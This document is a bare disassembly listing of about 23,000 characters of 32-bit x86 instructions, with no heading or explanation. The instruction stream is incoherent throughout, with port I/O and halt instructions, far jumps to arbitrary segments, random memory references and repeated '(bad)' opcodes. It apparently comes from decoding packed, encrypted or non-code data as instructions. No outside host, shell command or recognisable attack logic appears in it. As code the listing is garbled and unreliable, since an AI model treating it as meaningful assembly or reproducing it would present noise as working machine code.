  413d4e:	scas   al,BYTE PTR es:[edi]
  413d4f:	lods   al,BYTE PTR ds:[esi]
  413d50:	sub    BYTE PTR [esi-0x58],al
  413d53:	xchg   edx,eax
  413d54:	add    ch,BYTE PTR [eax-0x43]
  413d57:	je     0x413dc6
  413d59:	cli    
  413d5a:	repz push es
  413d5c:	xor    ebx,DWORD PTR [edx]
  413d5e:	(bad)  
  413d5f:	jp     0x413cee
  413d61:	leave  
  413d62:	sbb    dh,dl
  413d64:	adc    ebp,ebx
  413d66:	xor    dl,BYTE PTR [edx-0x9]
  413d69:	mov    ds:0xeea0af8d,eax
  413d6e:	aaa    
  413d6f:	call   0x8f1c:0x6dd9b976
  413d76:	ds pop ss
  413d78:	cmp    esp,DWORD PTR [edi]
  413d7a:	fnsave [edx-0x5e441eef]
  413d80:	mov    ds:0x61689738,eax
  413d85:	fsub   QWORD PTR [esi]
  413d87:	test   al,0x50
  413d89:	ss xchg edi,eax
  413d8b:	jb     0x413d1a
  413d8d:	dec    edi
  413d8e:	gs in  al,dx
  413d90:	repz rcr BYTE PTR [ecx],1
  413d93:	cmp    ax,0x17ac
  413d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d98:	out    0xb5,al
  413d9a:	neg    BYTE PTR [edx]
  413d9c:	jle    0x413d8f
  413d9e:	mov    ah,0xe2
  413da0:	fdiv   DWORD PTR [ecx+0x5924973b]
  413da6:	call   0x3df086d0
  413dab:	std    
  413dac:	cmp    DWORD PTR [esi+0x57],eax
  413daf:	inc    ecx
  413db0:	cmp    edi,DWORD PTR gs:[ebx+0x50]
  413db4:	test   al,0x25
  413db6:	clc    
  413db7:	pop    ecx
  413db8:	jle    0x413dae
  413dba:	ficom  WORD PTR [edi-0x67]
  413dbd:	push   0x3e859bb9
  413dc2:	mov    WORD PTR [ebp-0x5b3c6b66],?
  413dc8:	in     eax,0xc
  413dca:	or     DWORD PTR [edx-0x1d],edx
  413dcd:	jp     0x413e49
  413dcf:	mov    edi,gs
  413dd1:	push   edi
  413dd2:	imul   eax,DWORD PTR [edi-0x6580e273],0x7c8db4f3
  413ddc:	mov    al,0x26
  413dde:	shr    BYTE PTR [edx],1
  413de0:	add    dl,BYTE PTR ds:0xde4299ed
  413de6:	push   edi
  413de7:	jmp    0x411323c4
  413dec:	jmp    0x413e08
  413dee:	jmp    0x7706:0x9f81ea6c
  413df5:	es or  al,0xeb
  413df8:	push   es
  413df9:	xchg   ebx,eax
  413dfa:	mov    cl,0x79
  413dfc:	mov    ?,WORD PTR [ebx+0x8]
  413dff:	mov    ebp,0x97b4183
  413e04:	leave  
  413e05:	out    0xae,al
  413e07:	pop    es
  413e08:	add    esi,DWORD PTR [ebx]
  413e0a:	gs in  al,dx
  413e0c:	jle    0x413e48
  413e0e:	fucomi st,st(5)
  413e10:	inc    edx
  413e11:	cmp    dh,BYTE PTR [ebp-0x759edd2c]
  413e17:	xchg   esp,eax
  413e18:	or     eax,0x981a661b
  413e1d:	sub    ecx,ebp
  413e1f:	bound  ecx,QWORD PTR [edx+ebx*2+0x1a]
  413e23:	dec    ecx
  413e24:	scas   al,BYTE PTR es:[edi]
  413e25:	mov    gs,WORD PTR [edi]
  413e27:	jmp    0x5ca9:0xcafcd5fc
  413e2e:	pushf  
  413e2f:	aaa    
  413e30:	cli    
  413e31:	jecxz  0x413e9c
  413e33:	imul   BYTE PTR [edx+ecx*2+0x18]
  413e37:	inc    edx
  413e38:	xchg   edi,eax
  413e39:	mov    ds:0x55a83fb4,al
  413e3e:	mov    ds:0xceab88e0,al
  413e43:	add    eax,0x428ae2d0
  413e48:	test   DWORD PTR [ecx+ebx*8],0xd71e6116
  413e4f:	ins    BYTE PTR es:[edi],dx
  413e50:	js     0x413e9f
  413e52:	mov    ah,0x3a
  413e54:	fisubr WORD PTR [ebp+eax*8+0x3aff4523]
  413e5b:	push   0x77
  413e5d:	mov    ds:0xf77cf0c4,al
  413e62:	inc    edi
  413e63:	sbb    al,0x68
  413e65:	push   ds
  413e66:	into   
  413e67:	loope  0x413e5d
  413e69:	add    al,0x38
  413e6b:	test   BYTE PTR [eax-0x34],0x65
  413e6f:	add    DWORD PTR [edi+eax*1-0x5c635187],ebx
  413e76:	mov    ds:0x51a336c6,eax
  413e7b:	popa   
  413e7c:	data16 cmp al,0x9a
  413e7f:	dec    esp
  413e80:	mov    dh,0x31
  413e82:	mul    DWORD PTR [ebx-0x36ae927c]
  413e88:	mov    cl,0xe1
  413e8a:	cmp    al,0x88
  413e8c:	enter  0x578d,0xd8
  413e90:	clc    
  413e91:	add    BYTE PTR [ecx],bl
  413e93:	xor    al,0xa0
  413e95:	dec    edx
  413e96:	jnp    0x413e55
  413e98:	pop    ecx
  413e99:	scas   al,BYTE PTR es:[edi]
  413e9a:	or     al,bl
  413e9c:	dec    ebp
  413e9d:	inc    ebx
  413e9e:	nop
  413e9f:	sbb    bl,BYTE PTR [ecx+ebx*4]
  413ea2:	dec    ecx
  413ea3:	or     al,0x95
  413ea5:	fidiv  WORD PTR [ecx-0x5c]
  413ea8:	inc    edi
  413ea9:	fld    st(1)
  413eab:	scas   eax,DWORD PTR es:[edi]
  413eac:	loopne 0x413e76
  413eae:	jbe    0x413ee7
  413eb0:	xchg   DWORD PTR es:[esi],edi
  413eb3:	repnz pop esi
  413eb5:	in     eax,0x3f
  413eb7:	dec    ebp
  413eb8:	scas   eax,DWORD PTR es:[edi]
  413eb9:	pop    ss
  413eba:	inc    edi
  413ebb:	in     al,dx
  413ebc:	jmp    0x413ec6
  413ebe:	sbb    ecx,edi
  413ec0:	cli    
  413ec1:	jb     0x413f01
  413ec3:	nop
  413ec4:	jmp    0x413e95
  413ec6:	xchg   BYTE PTR [edx],bl
  413ec8:	pushf  
  413ec9:	mov    eax,ds:0xa7756b90
  413ece:	inc    edx
  413ecf:	stos   BYTE PTR es:[edi],al
  413ed0:	and    esi,edi
  413ed2:	xlat   BYTE PTR ds:[ebx]
  413ed3:	or     eax,0x5ecfdf39
  413ed8:	retf   0x411b
  413edb:	mov    ebp,0x8c04b12c
  413ee0:	mov    ds:0x404fbcd7,eax
  413ee5:	fdiv   DWORD PTR [ebx+0x27]
  413ee8:	daa    
  413ee9:	fnsave fs:[edi-0x45]
  413eed:	lahf   
  413eee:	hlt    
  413eef:	(bad)  
  413ef0:	pop    ebp
  413ef1:	mov    ebp,0x7ee18c88
  413ef6:	mov    edi,0xd46db5d2
  413efb:	adc    edx,DWORD PTR [edi+0x3c76de1c]
  413f01:	adc    dl,cl
  413f03:	gs nop
  413f05:	dec    ebx
  413f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f07:	cmp    edx,DWORD PTR [ebx]
  413f09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f0a:	push   esp
  413f0b:	cs pop edx
  413f0d:	mov    al,ds:0xa338bdb0
  413f12:	sub    DWORD PTR [edx+eax*1],esi
  413f15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f16:	mov    cl,0x1b
  413f18:	dec    ebx
  413f19:	xchg   esp,eax
  413f1a:	pop    ds
  413f1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f1c:	dec    edx
  413f1d:	ret    
  413f1e:	mov    ch,0x37
  413f20:	and    esp,eax
  413f22:	pop    ss
  413f23:	mov    bl,BYTE PTR [ebx]
  413f25:	fsubr  QWORD PTR [edx-0x1e]
  413f28:	rcl    DWORD PTR [eax+0x1262706f],0xa7
  413f2f:	inc    esi
  413f30:	xor    edx,DWORD PTR [ebx]
  413f32:	scas   al,BYTE PTR es:[edi]
  413f33:	call   0xbfae:0xae669a8d
  413f3a:	retf   
  413f3b:	push   0x46253bef
  413f40:	int3   
  413f41:	enter  0xf46b,0x64
  413f45:	mov    ds:0xca4966d9,eax
  413f4a:	dec    ecx
  413f4b:	dec    ebx
  413f4c:	and    edi,DWORD PTR [esi-0x5e3eac76]
  413f52:	cli    
  413f53:	ja     0x413f4b
  413f55:	lods   eax,DWORD PTR ds:[esi]
  413f56:	or     edi,DWORD PTR [eax]
  413f58:	jno    0x413f0c
  413f5a:	es js  0x413fcc
  413f5d:	frstor [edi]
  413f5f:	fidivr WORD PTR [ebp+0x67]
  413f62:	les    edx,FWORD PTR [esi]
  413f64:	in     al,dx
  413f65:	mov    edx,0x7ba155d8
  413f6a:	ins    BYTE PTR es:[edi],dx
  413f6b:	push   eax
  413f6c:	jle    0x413f1d
  413f6e:	xlat   BYTE PTR ds:[ebx]
  413f6f:	jge    0x413fba
  413f71:	bound  edi,QWORD PTR [ecx-0x2c]
  413f74:	jnp    0x413f4a
  413f76:	jne    0x413f24
  413f78:	or     esp,DWORD PTR [eax]
  413f7a:	xor    DWORD PTR [ebp+0x60f8e979],esi
  413f80:	das    
  413f81:	shl    DWORD PTR [ebx],cl
  413f83:	je     0x413fb4
  413f85:	or     BYTE PTR [edi-0x36],al
  413f88:	iret   
  413f89:	jnp    0x413ff8
  413f8b:	mov    DWORD PTR [edi-0x3a80a496],ecx
  413f91:	imul   edi,ebp,0xffffffb2
  413f94:	aam    0x78
  413f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f97:	iret   
  413f98:	and    al,bh
  413f9a:	dec    eax
  413f9b:	sahf   
  413f9c:	xlat   BYTE PTR ds:[ebx]
  413f9d:	dec    dh
  413f9f:	sub    DWORD PTR [ebx-0x5c],ebp
  413fa2:	jmp    0x413fda
  413fa4:	fcomp  QWORD PTR [ebp+0x7b]
  413fa7:	xor    DWORD PTR [edx-0x61],esp
  413faa:	rol    DWORD PTR [esi],0xbe
  413fad:	fwait
  413fae:	pop    esp
  413faf:	mov    bh,0xe6
  413fb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fb2:	xchg   edi,eax
  413fb3:	add    dh,al
  413fb5:	and    BYTE PTR [ebx+0x76],ah
  413fb8:	inc    esi
  413fb9:	gs pop eax
  413fbb:	mov    BYTE PTR [edx],bh
  413fbd:	stos   BYTE PTR es:[edi],al
  413fbe:	js     0x413f52
  413fc0:	daa    
  413fc1:	or     eax,0x3fa5e5d9
  413fc6:	mov    al,0x63
  413fc8:	mov    ebx,0xd849043a
  413fcd:	jle    0x41400e
  413fcf:	and    ch,bh
  413fd1:	pop    ebx
  413fd2:	pop    edi
  413fd3:	out    dx,al
  413fd4:	xchg   ebx,eax
  413fd5:	push   DWORD PTR [eax-0x3e33317a]
  413fdb:	mov    cl,0xf8
  413fdd:	sbb    eax,0xc2929c1a
  413fe2:	div    DWORD PTR [eax-0x1b2d2682]
  413fe8:	dec    edi
  413fe9:	daa    
  413fea:	clc    
  413feb:	push   0xbcd574
  413ff0:	ret    0xd12f
  413ff3:	neg    ecx
  413ff5:	(bad)  
  413ff6:	xor    al,0xdf
  413ff8:	leave  
  413ff9:	jbe    0x413feb
  413ffb:	jp     0x41404f
  413ffd:	cmp    BYTE PTR [ecx-0x41],0x4d
  414001:	dec    esi
  414002:	jb     0x414004
  414004:	add    ebp,DWORD PTR [edi-0x80]
  414007:	hlt    
  414008:	jno    0x414015
  41400a:	imul   ecx,DWORD PTR gs:[edx],0xffffff96
  41400e:	dec    esp
  41400f:	mov    ds:0x17bf319e,al
  414014:	cs xchg ebx,eax
  414016:	inc    bl
  414018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414019:	and    eax,0x195a63fb
  41401e:	repz jge 0x414067
  414021:	sub    BYTE PTR [edi],bh
  414023:	popf   
  414024:	mov    ebp,0x2cba0754
  414029:	stc    
  41402a:	mov    eax,0xe735fec2
  41402f:	jbe    0x413fc4
  414031:	stos   BYTE PTR es:[edi],al
  414032:	mov    WORD PTR [edi+0x155f5eaf],fs
  414038:	dec    edi
  414039:	retf   
  41403a:	jl     0x414012
  41403c:	xchg   ecx,eax
  41403d:	dec    edx
  41403e:	push   ss
  41403f:	adc    edi,DWORD PTR [eax+0x28a4490f]
  414045:	and    ecx,DWORD PTR [eax+0x370870ac]
  41404b:	bound  ecx,QWORD PTR [ebp+0x3e5ab796]
  414051:	cmp    al,0x5
  414054:	cmc    
  414055:	stos   BYTE PTR es:[edi],al
  414056:	pop    edx
  414057:	or     eax,0x416112b7
  41405c:	lahf   
  41405d:	in     al,0x2d
  41405f:	sub    ch,ah
  414061:	or     cl,BYTE PTR [ebx-0x127d7870]
  414067:	mov    esp,0x62603f78
  41406c:	dec    edi
  41406d:	aad    0x5c
  41406f:	loope  0x414029
  414071:	push   edx
  414072:	or     ah,dh
  414074:	xchg   edi,eax
  414075:	pop    ss
  414076:	inc    ebp
  414077:	hlt    
  414078:	leave  
  414079:	in     eax,0xc8
  41407b:	adc    esi,DWORD PTR [edx-0x2b]
  41407e:	adc    eax,0x8026ef40
  414083:	xor    esi,DWORD PTR [edi-0x3a]
  414086:	or     al,0x81
  414088:	add    bh,bh
  41408a:	sub    BYTE PTR [ebx],ah
  41408c:	push   0x30
  41408e:	cmp    eax,DWORD PTR [edx+0x18]
  414091:	ror    dl,0xd7
  414094:	fist   DWORD PTR [edi]
  414096:	push   eax
  414097:	in     al,dx
  414098:	dec    edx
  414099:	div    ebp
  41409b:	sub    al,0x63
  41409d:	jmp    0x4140d6
  41409f:	jecxz  0x414050
  4140a1:	cmp    eax,0xdecc9d6d
  4140a6:	xchg   DWORD PTR fs:[ebx+edi*4-0x4f],ebx
  4140ab:	iret   
  4140ac:	xlat   BYTE PTR ds:[ebx]
  4140ad:	pop    edx
  4140ae:	mov    ch,0x73
  4140b0:	xor    BYTE PTR [ebx],al
  4140b2:	aam    0x22
  4140b4:	rcr    eax,cl
  4140b6:	push   es
  4140b7:	jl     0x414064
  4140b9:	cs ja  0x4140a6
  4140bc:	iret   
  4140bd:	shl    bl,cl
  4140bf:	inc    edx
  4140c0:	xchg   ebp,eax
  4140c1:	shl    BYTE PTR [ecx+0x76f7f976],cl
  4140c7:	adc    cl,0xf8
  4140ca:	xchg   ebp,eax
  4140cb:	data16 je 0x414140
  4140ce:	xchg   BYTE PTR [edx-0xc],bl
  4140d1:	imul   ecx,DWORD PTR [edi+eax*2-0x4a],0x2c04ed1
  4140d9:	mov    dl,0x21
  4140db:	xchg   esp,eax
  4140dc:	sbb    bh,cl
  4140de:	psubd  mm2,mm7
  4140e1:	dec    edx
  4140e2:	test   al,0xd7
  4140e4:	push   es
  4140e5:	data16 and al,0x0
  4140e8:	push   edx
  4140e9:	dec    eax
  4140ea:	add    eax,0x3fcccf98
  4140ef:	push   edi
  4140f0:	popf   
  4140f1:	add    BYTE PTR [eax+0x6bc65fee],ah
  4140f7:	imul   edx,ebp,0x5e
  4140fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140fb:	in     al,0xa0
  4140fd:	mov    WORD PTR [ebx],fs
  4140ff:	mov    al,ds:0x90b4d792
  414104:	mov    WORD PTR [ecx-0x1771d8bf],gs
  41410a:	jb     0x4140d0
  41410c:	inc    esp
  41410d:	pop    ebp
  41410e:	mov    ebx,0x1088727b
  414113:	mov    bl,0xa2
  414116:	xlat   BYTE PTR ds:[ebx]
  414117:	dec    eax
  414118:	push   ds
  414119:	data16 cmp al,0x5
  41411c:	inc    ebp
  41411d:	(bad)  
  41411e:	(bad)  
  41411f:	jb     0x414150
  414121:	mov    dl,0xaa
  414123:	pop    ebp
  414124:	push   edx
  414125:	jg     0x4140d4
  414127:	push   cs
  414128:	adc    BYTE PTR [ecx+edi*4-0xb],0x31
  41412d:	and    ecx,DWORD PTR [esi]
  41412f:	sub    ebx,ebp
  414131:	adc    BYTE PTR [ecx+edx*2],0xc4
  414135:	inc    edi
  414136:	lods   eax,DWORD PTR ds:[esi]
  414137:	xchg   esp,eax
  414138:	in     eax,dx
  414139:	push   eax
  41413a:	mov    eax,DWORD PTR [esi-0x63]
  41413d:	(bad)  
  41413e:	icebp  
  41413f:	or     al,0xe6
  414141:	sbb    al,0xb3
  414143:	or     al,0xac
  414145:	and    DWORD PTR [eax],edx
  414147:	push   0xffffffaa
  414149:	mov    ebp,0xd3840e81
  41414e:	aaa    
  41414f:	cmp    eax,0x820b567
  414154:	pop    eax
  414155:	js     0x4140f2
  414157:	xchg   ebx,eax
  414158:	ret    0x45e9
  41415b:	fdiv   st,st(4)
  41415d:	or     eax,0x1842454c
  414162:	repz shl DWORD PTR [eax],0xfe
  414166:	push   edi
  414167:	add    al,0x99
  414169:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41416a:	xor    al,0xd1
  41416c:	inc    DWORD PTR [edx+ebx*8+0x45]
  414170:	xchg   ecx,eax
  414171:	loope  0x414199
  414173:	xor    al,0x45
  414175:	mov    bl,0x95
  414177:	in     eax,0xbe
  414179:	daa    
  41417a:	inc    ebp
  41417b:	ror    DWORD PTR [esi-0x4bd11273],cl
  414181:	sbb    bh,dl
  414183:	sub    edi,eax
  414185:	xchg   ecx,eax
  414186:	daa    
  414187:	(bad)  [ecx-0x69]
  41418a:	clc    
  41418b:	xor    DWORD PTR [eax+0x13],0xa
  41418f:	mov    edx,0x3966f89d
  414194:	jnp    0x41416a
  414196:	in     al,dx
  414197:	mov    ch,0x5a
  414199:	push   ebp
  41419a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41419b:	mov    edi,0x2b75958f
  4141a0:	lahf   
  4141a1:	jecxz  0x4141d2
  4141a3:	mov    edi,0x3c6bc49b
  4141a8:	std    
  4141a9:	jg     0x649b0487
  4141af:	and    ebx,ebx
  4141b1:	inc    esi
  4141b2:	xor    eax,0xd15f7975
  4141b7:	outs   dx,BYTE PTR ds:[esi]
  4141b8:	leave  
  4141b9:	push   ebx
  4141ba:	add    al,0x60
  4141bc:	iret   
  4141bd:	int3   
  4141be:	push   ebx
  4141bf:	push   esp
  4141c0:	cs je  0x414173
  4141c3:	sub    al,0xce
  4141c5:	mov    DWORD PTR [ecx],ecx
  4141c7:	jno    0x414201
  4141c9:	xor    eax,0x37aaecca
  4141ce:	mov    bh,BYTE PTR [ebx]
  4141d0:	xchg   ebx,eax
  4141d1:	shl    DWORD PTR [ebp-0x59],1
  4141d4:	daa    
  4141d5:	fcomp  st(1)
  4141d7:	cmp    dl,BYTE PTR [eax-0x46]
  4141da:	jbe    0x414178
  4141dc:	into   
  4141dd:	sar    BYTE PTR [ebx+0x24],cl
  4141e0:	fwait
  4141e1:	xchg   ebp,eax
  4141e2:	out    0xce,al
  4141e4:	jo     0x414231
  4141e6:	xchg   ecx,eax
  4141e7:	and    BYTE PTR [esi],ch
  4141e9:	aaa    
  4141ea:	loope  0x414215
  4141ec:	mov    ebp,0x76a7a50f
  4141f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4141f2:	jo     0x41419f
  4141f4:	mov    BYTE PTR [ecx],ah
  4141f6:	xor    al,0xc1
  4141f8:	test   eax,0x3ee13554
  4141fd:	data16 or al,0xe3
  414200:	mov    eax,0x58e794ec
  414205:	sbb    bl,dl
  414207:	push   ecx
  414208:	xor    bl,BYTE PTR [ebx-0xe]
  41420b:	xchg   edx,eax
  41420c:	in     al,dx
  41420d:	sbb    bl,BYTE PTR [ebp-0x2a]
  414210:	je     0x4141c3
  414212:	cld    
  414213:	jecxz  0x414227
  414215:	xor    ebx,DWORD PTR [eax-0x49a17657]
  41421b:	jp     0x414258
  41421d:	xchg   edx,eax
  41421e:	push   esp
  41421f:	sub    BYTE PTR [eax],al
  414221:	mov    bh,0xdf
  414223:	push   eax
  414224:	out    0xe1,al
  414226:	pop    eax
  414227:	outs   dx,DWORD PTR ds:[esi]
  414228:	sbb    al,0xe4
  41422a:	cmp    al,0x34
  41422c:	retf   0x7199
  41422f:	aaa    
  414230:	xchg   BYTE PTR [ebx+0x4ee49320],ch
  414236:	rcl    BYTE PTR [ebp-0x57],cl
  414239:	sub    al,BYTE PTR [edi]
  41423b:	hlt    
  41423c:	xchg   esi,eax
  41423d:	div    DWORD PTR [ebx+0x5569cc03]
  414243:	mov    cs,WORD PTR [esi]
  414245:	in     eax,0x1e
  414247:	add    bl,bh
  414249:	mov    esi,0x8d3c2933
  41424e:	test   DWORD PTR [edi+0x649715d9],edx
  414254:	and    ebp,ebx
  414256:	push   edx
  414257:	dec    ebx
  414258:	rep ins DWORD PTR es:[edi],dx
  41425a:	pop    ss
  41425b:	mov    esi,0x8e57d9a4
  414260:	and    DWORD PTR [esi+edi*4+0x55874414],esi
  414267:	xor    eax,0x8a3e7c34
  41426c:	pusha  
  41426d:	mov    ebx,ebx
  41426f:	push   edi
  414270:	mov    edx,DWORD PTR [ebp+0x1da8ac79]
  414276:	loop   0x41421a
  414278:	lock cli 
  41427a:	push   es
  41427b:	push   ebp
  41427c:	lods   al,BYTE PTR ds:[esi]
  41427d:	xlat   BYTE PTR ds:[ebx]
  41427e:	xor    edx,esp
  414280:	loope  0x4142fc
  414282:	aaa    
  414283:	arpl   si,bx
  414285:	push   esi
  414286:	(bad)
  414289:	dec    esi
  41428a:	mov    BYTE PTR [ebx+0x80c5354],dh
  414290:	sar    DWORD PTR [esi-0x22],1
  414293:	test   ah,dl
  414295:	add    DWORD PTR [ecx+0x59],esi
  414298:	or     ah,BYTE PTR [eax]
  41429a:	out    dx,eax
  41429b:	loop   0x41422b
  41429d:	add    BYTE PTR [esi-0x1dd0dca6],bh
  4142a3:	cmp    DWORD PTR [ebx+0x7c],0xffffffc4
  4142a7:	and    dl,0x34
  4142aa:	mov    esp,0x42d252bc
  4142af:	xchg   ecx,eax
  4142b0:	mov    ss,edx
  4142b2:	cmp    ch,BYTE PTR [ebx]
  4142b4:	mov    al,0x85
  4142b6:	mov    ecx,0xd07dbe19
  4142bb:	inc    esp
  4142bc:	add    BYTE PTR [esp+ecx*1],dh
  4142bf:	fistp  QWORD PTR [ebp-0x185335ac]
  4142c5:	pushf  
  4142c6:	xor    ebx,ebp
  4142c8:	or     al,0xd
  4142cb:	fwait
  4142cc:	jne    0x4142b7
  4142ce:	outs   dx,DWORD PTR ds:[esi]
  4142cf:	mov    dh,0x20
  4142d1:	or     al,0x82
  4142d3:	shl    DWORD PTR [ebx+esi*2-0xe],cl
  4142d7:	push   ebx
  4142d8:	sbb    al,0x35
  4142da:	or     DWORD PTR [esi-0x1],0xb807d2ad
  4142e1:	and    dh,dl
  4142e3:	inc    edx
  4142e4:	or     eax,0x36
  4142e7:	jecxz  0x4142df
  4142e9:	cmovne edx,DWORD PTR [ebx+0x42]
  4142ed:	and    bl,dl
  4142ef:	in     eax,0xc6
  4142f1:	repz or eax,0x53f61914
  4142f7:	cmc    
  4142f8:	push   ecx
  4142f9:	cmp    ch,BYTE PTR [eax]
  4142fb:	xchg   ebx,eax
  4142fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142fd:	sahf   
  4142fe:	frstor [esi-0x1]
  414301:	or     al,0xf1
  414303:	push   ebp
  414304:	pop    es
  414305:	daa    
  414306:	xor    BYTE PTR [edx],0x4b
  414309:	loop   0x4142f2
  41430b:	sbb    BYTE PTR [ebp-0x57f9d534],dh
  414311:	out    0xdd,eax
  414313:	hlt    
  414314:	xor    ah,BYTE PTR [ebx]
  414316:	xchg   ebx,eax
  414317:	loope  0x414371
  414319:	in     al,dx
  41431a:	mov    esi,DWORD PTR [edi]
  41431c:	clc    
  41431d:	je     0x414365
  41431f:	push   eax
  414320:	add    ch,ah
  414322:	pop    ss
  414323:	dec    ebx
  414324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414325:	in     eax,0xf5
  414327:	int3   
  414328:	xchg   ebx,eax
  414329:	fst    QWORD PTR [esi+0x54f36022]
  41432f:	loop   0x4142dd
  414331:	int3   
  414332:	leave  
  414333:	push   cs
  414334:	inc    esi
  414335:	or     bl,BYTE PTR [esi+0x2d]
  414338:	stc    
  414339:	jl     0x414311
  41433b:	inc    ebp
  41433c:	mov    cl,0x63
  41433f:	mov    bh,al
  414341:	int3   
  414342:	mov    ds:0x57bb8041,al
  414347:	pop    ecx
  414348:	jns    0x41433f
  41434a:	pop    edx
  41434b:	mov    dl,0x4d
  41434d:	jl     0x4142f0
  41434f:	popa   
  414350:	sbb    esp,DWORD PTR [ecx+ebx*8-0x529f0b45]
  414357:	mov    al,ds:0x66a1f52
  41435c:	mov    dh,0x1
  41435e:	ret    0x10a7
  414361:	enter  0xd0ec,0xf
  414365:	add    al,0x24
  414367:	mov    edi,0x5e5b313a
  41436c:	imul   esi,DWORD PTR [edx-0x6f],0xffffff99
  414370:	fdivp  st(6),st
  414372:	lods   al,BYTE PTR ds:[esi]
  414373:	sub    dh,ch
  414375:	sbb    al,0x93
  414377:	ins    DWORD PTR es:[edi],dx
  414378:	or     al,0xbe
  41437a:	fild   QWORD PTR [ecx-0x79]
  41437d:	push   ds
  41437e:	fidivr DWORD PTR [eax-0x18bc164a]
  414384:	jmp    0xe387:0x4948e7bc
  41438b:	pushf  
  41438c:	in     al,dx
  41438d:	jo     0x41440b
  41438f:	pop    ecx
  414390:	sahf   
  414391:	mov    BYTE PTR ds:0xd79a8222,dl
  414397:	adc    cl,bl
  414399:	xchg   ebp,eax
  41439a:	inc    ecx
  41439b:	push   es
  41439c:	std    
  41439d:	outs   dx,DWORD PTR ds:[esi]
  41439e:	fbstp  TBYTE PTR [edi+0xe]
  4143a1:	lods   al,BYTE PTR ds:[esi]
  4143a2:	test   BYTE PTR [ebx-0x3c],0x8e
  4143a6:	push   cs
  4143a7:	mov    eax,DWORD PTR [ebx]
  4143a9:	les    ebx,FWORD PTR [edi+0x3148401f]
  4143af:	mov    ah,0x3
  4143b1:	ins    BYTE PTR es:[edi],dx
  4143b2:	push   ss
  4143b3:	(bad)  
  4143b4:	adc    al,0xfa
  4143b6:	dec    esi
  4143b7:	lds    edi,FWORD PTR [ebx+0x18]
  4143ba:	sbb    al,0x7e
  4143bc:	fnstsw WORD PTR [esi+0x639d6c6f]
  4143c2:	push   ebx
  4143c3:	ds jns 0x414390
  4143c6:	xor    al,0xd4
  4143c8:	adc    eax,0xa098d130
  4143cd:	mov    ch,0x62
  4143cf:	jl     0x4143bf
  4143d1:	mov    esi,0x4c216473
  4143d6:	(bad)  
  4143d8:	pushf  
  4143d9:	cmp    DWORD PTR [esi-0x796f00b2],edi
  4143df:	fmul   QWORD PTR [ecx+0x22]
  4143e2:	call   0x55814cdd
  4143e7:	sahf   
  4143e8:	sar    BYTE PTR [edi+0x63],1
  4143eb:	sub    ecx,edi
  4143ed:	jmp    0x414408
  4143ef:	inc    ebp
  4143f0:	mov    eax,0x731cda43
  4143f5:	jge    0x414431
  4143f7:	lds    eax,FWORD PTR [esi-0x3a9fed2a]
  4143fd:	aaa    
  4143fe:	dec    esi
  4143ff:	sbb    eax,0xa8ce556d
  414404:	out    0x99,eax
  414406:	cdq    
  414407:	scas   eax,DWORD PTR es:[edi]
  414408:	push   eax
  414409:	jmp    0x414480
  41440b:	and    esp,DWORD PTR [eax+ebp*2-0x4805ae5f]
  414412:	mov    ?,WORD PTR [eax+0x5a]
  414415:	mov    WORD PTR [edx+ebx*2+0xa68bcb3],ss
  41441c:	xor    bl,ch
  41441e:	pop    ebp
  41441f:	loope  0x4143c9
  414421:	sahf   
  414422:	jmp    FWORD PTR [ebp+eax*1-0xe8ff1de]
  414429:	mov    bl,0x18
  41442b:	cmp    cl,BYTE PTR [edi-0x1df5e3ff]
  414431:	mov    edx,0xcb2df91b
  414436:	icebp  
  414437:	jae    0x41440a
  414439:	jbe    0x4143fe
  41443b:	push   ebp
  41443c:	(bad)  
  41443d:	and    DWORD PTR [ebx+0x371502c6],0xa306aac1
  414447:	mov    BYTE PTR [ebx],bh
  414449:	cld    
  41444a:	inc    edi
  41444b:	lods   al,BYTE PTR ds:[esi]
  41444c:	call   0x97c7b522
  414451:	push   edx
  414452:	mov    esp,0x40cfd0de
  414457:	add    al,0xbd
  414459:	aad    0x99
  41445b:	imul   edx,DWORD PTR [eax],0x73
  41445e:	push   0xffffff9b
  414460:	je     0x4144bf
  414462:	adc    eax,0x4337b000
  414467:	rcl    BYTE PTR [esi-0x13],0x9b
  41446b:	cmp    BYTE PTR [ecx+0x4beb0ef9],bh
  414471:	sahf   
  414472:	fwait
  414473:	imul   eax,esi,0xffffffe9
  414476:	mov    ds:0x68177775,al
  41447b:	fwait
  41447c:	lock iret 
  41447e:	lock xor DWORD PTR [ebx],ecx
  414481:	popa   
  414482:	and    ah,BYTE PTR ds:0xa5fc37ad
  414488:	xchg   ebx,eax
  414489:	mov    dh,0x83
  41448b:	std    
  41448c:	and    eax,0x2fa0a882
  414491:	inc    ecx
  414492:	out    dx,eax
  414493:	mov    al,ds:0x1c492225
  414498:	jne    0x41444e
  41449a:	adc    al,0xdc
  41449c:	xor    BYTE PTR [ebx],bl
  41449e:	jne    0x4144d3
  4144a0:	push   ds
  4144a1:	aam    0x88
  4144a3:	fisubr WORD PTR [esi+0x4553fcb]
  4144a9:	mov    dl,BYTE PTR [esi+ebp*2+0x4f]
  4144ad:	out    dx,al
  4144ae:	and    bl,bh
  4144b0:	cmp    al,0xa9
  4144b2:	sub    bl,BYTE PTR [ebp+0x67]
  4144b5:	mov    bh,BYTE PTR [ebx+ecx*2-0x8]
  4144b9:	or     eax,DWORD PTR [edx+ebp*4]
  4144bc:	arpl   WORD PTR ds:0x9d69653,bx
  4144c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144c3:	fisttp QWORD PTR [eax]
  4144c5:	fst    QWORD PTR [ecx+0x5e]
  4144c8:	inc    ecx
  4144c9:	mov    al,0xc0
  4144cb:	or     bl,BYTE PTR [edi+0x5a]
  4144ce:	scas   eax,DWORD PTR es:[edi]
  4144cf:	jne    0x414472
